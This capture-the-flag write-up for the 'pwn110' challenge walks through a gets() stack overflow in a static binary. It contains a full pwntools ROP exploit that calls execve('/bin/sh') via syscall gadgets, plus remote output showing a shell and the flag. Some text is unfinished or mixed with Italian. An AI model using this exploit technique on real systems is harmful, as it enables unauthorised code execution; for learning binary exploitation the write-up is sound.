# pwn 110

## Binary Analisys

```bash
$ ls 
pwn110

$ file pwn110 
pwn110: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=9765ee1bc5e845af55929a99730baf4dccbb1990, for GNU/Linux 3.2.0, not stripped

$ checksec --file=pwn110
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

The binary is **statically linked** and this means that all the dependencies are resolved at *compilation time* with the injection of code in the binary.

```bash
$ rabin2 -S pwn110 
nth paddr          size vaddr         vsize perm flags type       name
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000      0x0 0x00000000      0x0 ---- 0x0   NULL
1   0x00000270     0x20 0x00400270     0x20 -r-- 0x2   NOTE       .note.gnu.property
2   0x00000290     0x24 0x00400290     0x24 -r-- 0x2   NOTE       .note.gnu.build-id
3   0x000002b4     0x20 0x004002b4     0x20 -r-- 0x2   NOTE       .note.ABI-tag
4   0x000002d8    0x240 0x004002d8    0x240 -r-- 0x42  RELA       .rela.plt
5   0x00001000     0x1b 0x00401000     0x1b -r-x 0x6   PROGBITS   .init
6   0x00001020    0x180 0x00401020    0x180 -r-x 0x6   PROGBITS   .plt
7   0x000011a0  0x91e60 0x004011a0  0x91e60 -r-x 0x6   PROGBITS   .text
8   0x00093000   0x1ca0 0x00493000   0x1ca0 -r-x 0x6   PROGBITS   __libc_freeres_fn
9   0x00094ca0      0xd 0x00494ca0      0xd -r-x 0x6   PROGBITS   .fini
10  0x00095000  0x1c14c 0x00495000  0x1c14c -r-- 0x2   PROGBITS   .rodata
11  0x000b114c      0x1 0x004b114c      0x1 -r-- 0x2   PROGBITS   .stapsdt.base
12  0x000b1150   0xa6cc 0x004b1150   0xa6cc -r-- 0x2   PROGBITS   .eh_frame
13  0x000bb81c     0xe9 0x004bb81c     0xe9 -r-- 0x2   PROGBITS   .gcc_except_table
14  0x000bc0c0     0x20 0x004bd0c0     0x20 -rw- 0x403 PROGBITS   .tdata
15  0x000bc0e0      0x0 0x004bd0e0     0x40 -rw- 0x403 NOBITS     .tbss
16  0x000bc0e0     0x10 0x004bd0e0     0x10 -rw- 0x3   INIT_ARRAY .init_array
17  0x000bc0f0     0x10 0x004bd0f0     0x10 -rw- 0x3   FINI_ARRAY .fini_array
18  0x000bc100   0x2df4 0x004bd100   0x2df4 -rw- 0x3   PROGBITS   .data.rel.ro
19  0x000beef8     0xf0 0x004bfef8     0xf0 -rw- 0x3   PROGBITS   .got
20  0x000bf000     0xd8 0x004c0000     0xd8 -rw- 0x3   PROGBITS   .got.plt
21  0x000bf0e0   0x1a50 0x004c00e0   0x1a50 -rw- 0x3   PROGBITS   .data
22  0x000c0b30     0x48 0x004c1b30     0x48 -rw- 0x3   PROGBITS   __libc_subfreeres
23  0x000c0b80    0x6a8 0x004c1b80    0x6a8 -rw- 0x3   PROGBITS   __libc_IO_vtables
24  0x000c1228      0x8 0x004c2228      0x8 -rw- 0x3   PROGBITS   __libc_atexit
25  0x000c1230      0x0 0x004c2240   0x1718 -rw- 0x3   NOBITS     .bss
26  0x000c1230      0x0 0x004c3958     0x28 -rw- 0x3   NOBITS     __libc_freeres_ptrs
27  0x000c1230     0x2a 0x00000000     0x2a ---- 0x30  PROGBITS   .comment
28  0x000c125c   0x13e8 0x00000000   0x13e8 ---- 0x0   NOTE       .note.stapsdt
29  0x000c2648   0xb028 0x00000000   0xb028 ---- 0x0   SYMTAB     .symtab
30  0x000cd670   0x6ec9 0x00000000   0x6ec9 ---- 0x0   STRTAB     .strtab
31  0x000d4539    0x157 0x00000000    0x157 ---- 0x0   STRTAB     .shstrtab

```

The binary contains a lot od symbols (~1878).

```bash
$ readelf --syms pwn110
```

But it is **No Stripped** and this means that there are symbols like entr

`radare2`

```bash
[0x00401cc0]> s entry
entry.fini1   entry.init1   entry0        entry.fini0   entry.init0   
[0x00401cc0]> s entry0 
[0x00401cc0]> pdfr
  ;-- _start:
  ;-- rip:
┌ 46: entry0 (func rtld_fini); // noreturn
│ `- args(rdx)
│ 0x00401cc0      f30f1efa       endbr64
│ 0x00401cc4      31ed           xor ebp, ebp
│ 0x00401cc6      4989d1         mov r9, rdx                           ; func rtld_fini
│ 0x00401cc9      5e             pop rsi                               ; int argc
│ 0x00401cca      4889e2         mov rdx, rsp                          ; char **ubp_av
│ 0x00401ccd      4883e4f0       and rsp, 0xfffffffffffffff0
│ 0x00401cd1      50             push rax
│ 0x00401cd2      54             push rsp
│ 0x00401cd3      49c7c0302f..   mov r8, sym.__libc_csu_fini           ; 0x402f30 ; func fini
│ 0x00401cda      48c7c1902e..   mov rcx, sym.__libc_csu_init          ; 0x402e90 ; func init
│ 0x00401ce1      48c7c7611e..   mov rdi, main                         ; 0x401e61 ; func main
└ 0x00401ce8      67e842050000   call sym.__libc_start_main            ; int __libc_start_main(func main, int argc, char **ubp_av, func init, func fini, func rtld_fini, void *stack_end)

[0x00401cc0]> s main 
[0x00401e61]> pdfr
  ; ICOD XREF from entry0 @ 0x401ce1(r)
┌ 76: int main (int argc, char **argv, char **envp);
│ afv: vars(1:sp[0x28..0x28])
│ 0x00401e61      f30f1efa       endbr64
│ 0x00401e65      55             push rbp
│ 0x00401e66      4889e5         mov rbp, rsp
│ 0x00401e69      4883ec20       sub rsp, 0x20
│ 0x00401e6d      b800000000     mov eax, 0
│ 0x00401e72      e86effffff     call sym.setup
│ 0x00401e77      b800000000     mov eax, 0
│ 0x00401e7c      e8c9ffffff     call sym.banner
│ 0x00401e81      488d3d9832..   lea rdi, str.Hello_pwner__Im_the_last_challenge_ ; 0x495120 ; "Hello pwner, I'm the last challenge \U0001f63c" ; const char *s
│ 0x00401e88      e843fd0000     call sym.puts                         ; int puts(const char *s)
│ 0x00401e8d      488d3dbc32..   lea rdi, str.Well_done__Now_try_to_pwn_me_without_libc_ ; 0x495150 ; "Well done, Now try to pwn me without libc \U0001f60f" ; const char *s
│ 0x00401e94      e837fd0000     call sym.puts                         ; int puts(const char *s)
│ 0x00401e99      488d45e0       lea rax, [s]
│ 0x00401e9d      4889c7         mov rdi, rax                          ; char *s
│ 0x00401ea0      b800000000     mov eax, 0
│ 0x00401ea5      e866fb0000     call sym.gets                         ; char *gets(char *s)
│ 0x00401eaa      90             nop
│ 0x00401eab      c9             leave
└ 0x00401eac      c3             ret

```

The *main* is **Buffer Overflow Vulnerable**.

How to exploit this vulnerability?

```bash
$ readelf --syms pwn110

#1878 results.

$ rabin2 -iz pwn110

#1319 results.
```

Try to catch some useful symbols and strings, like *system*, *execve* and */bin/sh* but there aren't.

The idea should be to try to use the `syscall` construct that are surely presenti nelle funzioni staticamente incorporate nel binario.

```bash
$ objdump -d -M intel pwn110 | grep syscall | wc -l
172

$ ropper --file=pwn110 --search syscall
...
0x00000000004173d4: syscall; ret;
```

> [https://www.gnu.org/software/libc/manual/html_node/System-Calls.html](https://www.gnu.org/software/libc/manual/html_node/System-Calls.html)

Looking for the is the system call number that identifies the *execve*.

> Note: the binary is **No PIE**.

`execve`

- **sysno**: 59
- **args**: const char \*filename, const char \*argv ,const char \*const \*envp.

=> `execve("/bin/sh", ...)`

ROP chain:

- padding
- pop rdi; pop rsi; ret
- 59
- "/bin/sh"
- syscall

### Gadgets

```bash
$ ropper --file=pwn110 --search "pop rdi"
0x00000000004035a3: pop rdi; pop rbp; ret;

$ ropper --file=pwn110 --search "mov rsi"
0x000000000047c34e: mov rsi, rbp; syscall;

```

Among the results it is not discovered any "pop rdi; pop rsi; ...; ret".

ROP chain:

- padding
- pop rdi; pop rbp; ret
- 59
- "/bin/sh"
- mov rsi, rbp; syscall;


### Stage 1: Overwrite the memory

- padding
- .data
- pop rbp; ret;
- pop rax; ret;
- "/bin/sh\x00"
- dummy
- dummy
- dummy
- mov qword ptr [rbp], rax; mov rax, r12; pop rbp; pop r12; pop r13; ret;

### Stage 2: syscall

- pop rdi; pop rbp; ret
- 59
- .data
- mov rsi, rbp; syscall;

```bash
$ ropper --file=pwn110 --search "pop rbp"
0x0000000000401da1: pop rbp; ret;

$ ropper --file=pwn110 --search "mov [rbp]"
0x000000000046e8bd: mov qword ptr [rbp], rax; mov rax, r12; pop rbp; pop r12; pop r13; ret;

$ ropper --search "pop rax"
0x00000000004497d7: pop rax; ret;

$ --search "pop rdi"
0x000000000040191a: pop rdi; ret;

$ 
0x000000000040181f: pop rdx; ret; 

$ ropper --file=pwn110 --search syscall
0x00000000004173d4: syscall; ret;
```

## Local Exploitation

Below is the `exploit` script built for *debugging*, *local* and *remote* exploitation.

```python
#!/usr/bin/env python3

from pwn import context, ELF, process, gdb, remote, flat

exe = './pwn110'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

gdbinit='''
init-pwndbg
break* main+73
continue
'''

## Crafting the payload ##

padding = 'A'*32 # fill the buffer

# .data
data=0x4c00e0

pop_rbp_ret=0x401da1

pop_rax_ret=0x4497d7

_bin_sh = b"//bin/sh"

mov_rbp_rax_ret = 0x46e8bd 

pop_rdi_rbp_ret = 0x4035a3

mov_rsi_rbp_syscall = 0x47c34e

execve_sysno = 59

pop_rdi_ret = 0x40191a

pop_rsi_ret = 0x48df60

pop_rdx_ret = 0x40181f

syscall_ret = 0x4173d4

dummy='B'*8

"""
### Stage 1: Overwrite the memory

- padding
- .data
- pop rbp; ret;
- pop rax; ret;
- "//bin/sh"
- mov qword ptr [rbp], rax; mov rax, r12; pop rbp; pop r12; pop r13; ret;
- dummy
- dummy
- dummy

### Stage 2: syscall

- pop rax; ret;
- 59
- pop rdi; ret;
- .data
- pop rsi; ret;
- 0 (no args)
- pop rdx; ret;
- 0 (no env vars)
- syscall; ret;

syscall( 59, "/bin/sh", 0, 0 ) => execve("/bin/sh",0,0)

"""

payload=flat([
    # Stage 1
	padding.encode(),
	data,
    #pop_rbp_ret,
    pop_rax_ret,
    _bin_sh,
    mov_rbp_rax_ret,
    dummy,
    dummy,
    dummy,
    # Stage 2
    pop_rax_ret,
	execve_sysno,
	pop_rdi_ret,
    data,
    pop_rsi_ret, # args
    0,
    pop_rdx_ret, # env vars
    0,
	syscall_ret
])


REMOTE, PORT = '10.10.51.133', 9010

#io=process([exe])
#io=gdb.debug([exe], gdbscript=gdbinit)
io=remote(REMOTE, PORT)

# Send after `Now try to pwn me without libc 😏\n`
io.sendlineafter(b'\x20\x4e\x6f\x77\x20\x74\x72\x79\x20\x74\x6f\x20\x70\x77\x6e\x20\x6d\x65\x20\x77\x69\x74\x68\x6f\x75\x74\x20\x6c\x69\x62\x63\x20\xf0\x9f\x98\x8f\x0a', payload)
io.interactive()

```

With the **GDB** debugger, it is possible to visualize the created ROP chain.

`gdb`
```text
 ► 0x401eaa <main+73>              nop    
   0x401eab <main+74>              leave  
   0x401eac <main+75>              ret                                <_nl_find_msg+483>
    ↓
   0x4035a3 <_nl_find_msg+483>     pop    rdi     RDI => 59
   0x4035a4 <_nl_find_msg+484>     pop    rbp     RBP => 0x68732f6e69622f
   0x4035a5 <_nl_find_msg+485>     ret                                <_dl_get_origin+46>
    ↓
   0x47c34e <_dl_get_origin+46>    mov    rsi, rbp                          RSI => 0x68732f6e69622f
   0x47c351 <_dl_get_origin+49>    syscall  <SYS_<unk_140731699266416>>
   0x47c353 <_dl_get_origin+51>    cmp    eax, 0xfffff000
   0x47c358 <_dl_get_origin+56>    ja     _dl_get_origin+152          <_dl_get_origin+152>
...
   0x47c418 <_dl_get_origin+248>    mov    r12, 0xffffffffffffffff            R12 => 0xffffffffffffffff
   0x47c41f <_dl_get_origin+255>    add    rsp, 0x1008                        RSP => 0x7ffea6f193c0 (0x7ffea6f183b8 + 0x1008)
 ► 0x47c426 <_dl_get_origin+262>    mov    rax, r12                           RAX => 0xffffffffffffffff
   0x47c429 <_dl_get_origin+265>    pop    rbx                                RBX => 0
   0x47c42a <_dl_get_origin+266>    pop    rbp                                RBP => 0
   0x47c42b <_dl_get_origin+267>    pop    r12                                R12 => 0
   0x47c42d <_dl_get_origin+269>    pop    r13                                R13 => 0
   0x47c42f <_dl_get_origin+271>    ret                                <0>

```

## Remote Exploitation

```bash
[DEBUG] Sent 0xa1 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  e0 00 4c 00  00 00 00 00  d7 97 44 00  00 00 00 00  │··L·│····│··D·│····│
    00000030  2f 2f 62 69  6e 2f 73 68  bd e8 46 00  00 00 00 00  │//bi│n/sh│··F·│····│
    00000040  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    00000050  42 42 42 42  42 42 42 42  d7 97 44 00  00 00 00 00  │BBBB│BBBB│··D·│····│
    00000060  3b 00 00 00  00 00 00 00  1a 19 40 00  00 00 00 00  │;···│····│··@·│····│
    00000070  e0 00 4c 00  00 00 00 00  60 df 48 00  00 00 00 00  │··L·│····│`·H·│····│
    00000080  00 00 00 00  00 00 00 00  1f 18 40 00  00 00 00 00  │····│····│··@·│····│
    00000090  00 00 00 00  00 00 00 00  d4 73 41 00  00 00 00 00  │····│····│·sA·│····│
    000000a0  0a                                                  │·│
    000000a1
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x19 bytes:
    b'flag.txt\n'
    b'pwn110\n'
    b'pwn110.c\n'
flag.txt
pwn110
pwn110.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x19 bytes:
    b'THM{n1c3_us3_0f_g4dg37s}\n'
THM{n1c3_us3_0f_g4dg37s}

```

GG :3

---
